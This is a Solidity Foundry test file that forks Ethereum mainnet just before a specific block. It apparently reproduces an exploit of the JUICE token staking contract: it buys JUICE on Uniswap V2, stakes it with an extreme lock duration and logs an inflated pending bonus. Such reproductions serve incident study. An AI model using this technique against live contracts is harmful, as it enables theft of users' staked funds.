// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

import "./IStaking.sol";

IERC20 constant JUICE = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IStaking constant JuiceStaking = IStaking(
    0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e
);

IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);

contract Juice is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19395636 - 1);
        deal(address(this), 0.5 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        JUICE.approve(address(JuiceStaking), type(uint256).max);
        JUICE.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);

        print("[Start] ETH balance before", address(this).balance, 18);

        // 0.5 ETH -> 2603.521112903506075187 JUICE
        getJUICE(0.5 ether);
        // stake 2603 Juice
        JuiceStaking.stake(2603 ether, 3000000000);

        // next
        vm.roll(block.number + 5);
        vm.warp(block.timestamp + 12);

        (uint256 pending, uint256 bonus) = JuiceStaking.pendingReward(
            address(this),
            0
        );
        print("pending", pending, 18);
        print("bonus", bonus, 18);

        uint256 bonusCal = ((pending * (3000000000 - 1) * 9) / 100);
        print("bonusCal", bonusCal, 18);
    }

    function getJUICE(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(JUICE);
        UNISWAP_V2_ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amount
        }(0, path, address(this), block.timestamp + 1);
    }

    receive() external payable {}
}
